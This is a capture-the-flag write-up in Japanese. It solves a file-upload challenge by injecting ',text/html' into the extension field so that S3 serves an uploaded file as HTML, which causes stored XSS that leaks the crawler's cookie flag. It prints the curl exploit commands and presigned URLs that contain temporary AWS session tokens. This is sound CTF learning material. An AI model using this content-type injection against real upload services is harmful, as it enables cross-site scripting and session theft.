# Content extension:Logic Bug:100pts

- [Target](https://d2vz6b0lfzqrg0.cloudfront.net/)

**source code**  

- [Web Application](https://drive.google.com/file/d/1L1cSAPkUCGr9GAdfaoXnOP4f6VMYerqt/view?usp=drive_link)  

※ If no announcement is made, all "Crawler" source codes are the same.  

[https://d2vz6b0lfzqrg0.cloudfront.net/](https://d2vz6b0lfzqrg0.cloudfront.net/)  

# Solution
URLとアプリケーションのソースが渡される。  
クローラは[Server Side Upload](../Server_Side_Upload)と同様で、ファイルアップロードサイトのようだ。  
![site.png](site/site.png)  
ソースの主要部分は以下であった。  
```ts
~~~
server.post<{
  Body: {
    extention: string;
    length: number;
  };
}>('/api/upload', async (request, reply) => {
  if (!request.body.extention || !request.body.length) {
    return reply.code(400).send({ error: 'No file uploaded' });
  }

  if (request.body.length > 1024 * 1024 * 100) {
    return reply.code(400).send({ error: 'File too large' });
  }

  const denyStringRegex = /[\s\;()]/;

  if (denyStringRegex.test(request.body.extention)) {
    return reply.code(400).send({ error: 'Invalid file type' });
  }

  const allowExtention = ['png', 'jpeg', 'jpg', 'gif'];

  const isAllowExtention = allowExtention.filter((ext) => request.body.extention.includes(ext)).length > 0;
  if (!isAllowExtention) {
    return reply.code(400).send({ error: 'Invalid file extention' });
  }

  const contentType = `image/${request.body.extention}`;
  const filename = uuidv4();
  const s3 = new S3Client({});
  const command = new PutObjectCommand({
    Bucket: process.env.BUCKET_NAME,
    Key: `upload/${filename}`,
    ContentLength: request.body.length,
    ContentType: contentType,
  });

  const url = await getSignedUrl(s3, command, {
    expiresIn: 60 * 60 * 24,
    signableHeaders: new Set(['content-type']),
  });
  return reply.header('content-type', 'application/json').send({
    url,
    filename,
  });
});
~~~
```
リクエストの`extention`を検証している。  
正規表現で`/[\s\;()]/`が禁止されており、`['png', 'jpeg', 'jpg', 'gif']`のうちのどれかが含まれている必要がある。  
最終的に`image/`の後ろに結合されている。  
[forward priority...](../forward_priority/)で`,`で区切れることを知ったため、そのテクニックを用いる。  
`png,text/html`を`extention`とすると`image/png,text/html`となり、HTMLとして読み込まれる。  
以下の通りにServer Side Uploadと同じファイルをアップロードする。  
```bash
$ curl -X POST -H 'Content-Type: application/json' -d '{"extention":"png,text/html","length":221}' --upload-file xs3.html 'https://d2vz6b0lfzqrg0.cloudfront.net/api/upload'
{"url":"https://uploadbucket-5b1bc63390-5-upload.s3.ap-northeast-1.amazonaws.com/upload/b0bd10c4-2bcb-477b-abae-17524bd6b544?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAUPVKPCT4EIBYG5EA%2F20240329%2Fap-northeast-1%2Fs3%2Faws4_request&X-Amz-Date=20240329T061144Z&X-Amz-Expires=86400&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEM7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaDmFwLW5vcnRoZWFzdC0xIkgwRgIhAL8TbR3agrOTOsE4l4Abddi5QpVyttVc%2FLSZdbqIXS0pAiEAqBGUQcxr6CRHZU0%2FNZWn9bRRemPcK7NzK75TNHKWJ2MqtwMI5%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARABGgwzMDg1MjE0MDc3MzYiDPPXwr2rsM7jnm8agiqLAw%2Fi52IWJOC7YQUReIuCShHHERT0plrDDs9sQon022blTqLm0JRdojaZvJTmMX40nzyujgy%2BdykfnI9K7LiUgUzoaCnmdjWBqNCpw4WWFGXL8yak%2F1p93ILMG28cAEMWBwXMwwP6yVzK6G8wukTJ1QRMneRj5IPMKdbdUPCQ84OYOOZQuDf0ZSNqwbBHtdMB6v24rzd6gCRkCX3YOYyau2Y3lvwkuQdtVbQt97f9cwoqYzkFSTwiPAknsG40QQjQntxgBQ1OdjRONeJJhSSk5GrQeltqP0bw1nGXMPeC%2B6Bu%2FQkwWyF9%2BUAbkJp7WY3fMOrgiatdGqpXMse4c8cZcvqCBg8cWIptPEs9KmL%2FfS8lqLjD3gSXi6LEBJ7%2BvYdbieiCBLeAs9ThjyBVjaAhH0v9d5GjINVo1Rt27Z%2BdZp%2FX8RQ7cThC0E%2B0g%2FlVC5BXpA2KWrQOO5f3KF%2FYHSmr3vPZlhDDAbo%2BI7%2BusPAWsjAY2Lt1wdIJJWwr6KXoFn7gvYdJKwLx1ATRABNqMJ63mbAGOp0BrjDBQEUoHYRm9v37TQAJVCxCBVTkhtg%2BpAR7Z7uhTyy1NhiqJ40CJN6XDdYJq%2Bfc7lKKI2JblYZ3XIBcrffBRxET%2Br1w3isiy%2B8Am67aZx%2FNoXuObERbGaFhSGg5DzbY%2FFQ0jmVejkXTa%2BW642tBtT%2Bg58vZbD0XSe28SKgwlnzesuhbHRdOj%2FwGSydmZ3cbLyBHJULIeeGxP1oozw%3D%3D&X-Amz-Signature=9712cf966b56da103a4bd424863f64fa5c9ce92c38468fc55141e46bdc3379bb&X-Amz-SignedHeaders=content-length%3Bcontent-type%3Bhost&x-id=PutObject","filename":"b0bd10c4-2bcb-477b-abae-17524bd6b544"}
$ curl -X PUT -H 'Content-Type: image/png,text/html' --upload-file xs3.html 'https://uploadbucket-5b1bc63390-5-upload.s3.ap-northeast-1.amazonaws.com/upload/b0bd10c4-2bcb-477b-abae-17524bd6b544?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAUPVKPCT4EIBYG5EA%2F20240329%2Fap-northeast-1%2Fs3%2Faws4_request&X-Amz-Date=20240329T061144Z&X-Amz-Expires=86400&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEM7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaDmFwLW5vcnRoZWFzdC0xIkgwRgIhAL8TbR3agrOTOsE4l4Abddi5QpVyttVc%2FLSZdbqIXS0pAiEAqBGUQcxr6CRHZU0%2FNZWn9bRRemPcK7NzK75TNHKWJ2MqtwMI5%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARABGgwzMDg1MjE0MDc3MzYiDPPXwr2rsM7jnm8agiqLAw%2Fi52IWJOC7YQUReIuCShHHERT0plrDDs9sQon022blTqLm0JRdojaZvJTmMX40nzyujgy%2BdykfnI9K7LiUgUzoaCnmdjWBqNCpw4WWFGXL8yak%2F1p93ILMG28cAEMWBwXMwwP6yVzK6G8wukTJ1QRMneRj5IPMKdbdUPCQ84OYOOZQuDf0ZSNqwbBHtdMB6v24rzd6gCRkCX3YOYyau2Y3lvwkuQdtVbQt97f9cwoqYzkFSTwiPAknsG40QQjQntxgBQ1OdjRONeJJhSSk5GrQeltqP0bw1nGXMPeC%2B6Bu%2FQkwWyF9%2BUAbkJp7WY3fMOrgiatdGqpXMse4c8cZcvqCBg8cWIptPEs9KmL%2FfS8lqLjD3gSXi6LEBJ7%2BvYdbieiCBLeAs9ThjyBVjaAhH0v9d5GjINVo1Rt27Z%2BdZp%2FX8RQ7cThC0E%2B0g%2FlVC5BXpA2KWrQOO5f3KF%2FYHSmr3vPZlhDDAbo%2BI7%2BusPAWsjAY2Lt1wdIJJWwr6KXoFn7gvYdJKwLx1ATRABNqMJ63mbAGOp0BrjDBQEUoHYRm9v37TQAJVCxCBVTkhtg%2BpAR7Z7uhTyy1NhiqJ40CJN6XDdYJq%2Bfc7lKKI2JblYZ3XIBcrffBRxET%2Br1w3isiy%2B8Am67aZx%2FNoXuObERbGaFhSGg5DzbY%2FFQ0jmVejkXTa%2BW642tBtT%2Bg58vZbD0XSe28SKgwlnzesuhbHRdOj%2FwGSydmZ3cbLyBHJULIeeGxP1oozw%3D%3D&X-Amz-Signature=9712cf966b56da103a4bd424863f64fa5c9ce92c38468fc55141e46bdc3379bb&X-Amz-SignedHeaders=content-length%3Bcontent-type%3Bhost&x-id=PutObject'
```
`https://d2vz6b0lfzqrg0.cloudfront.net/upload/b0bd10c4-2bcb-477b-abae-17524bd6b544`にアクセスすると案の定XSSが発生した。  
クローラへ投げると以下のリクエストが届く。  
```
GET
/?satoki=flag=flag{b1b3fcx5f8b508ff8b03b803affb00d381826047b}
```
flagが得られた。  

## flag{b1b3fcx5f8b508ff8b03b803affb00d381826047b}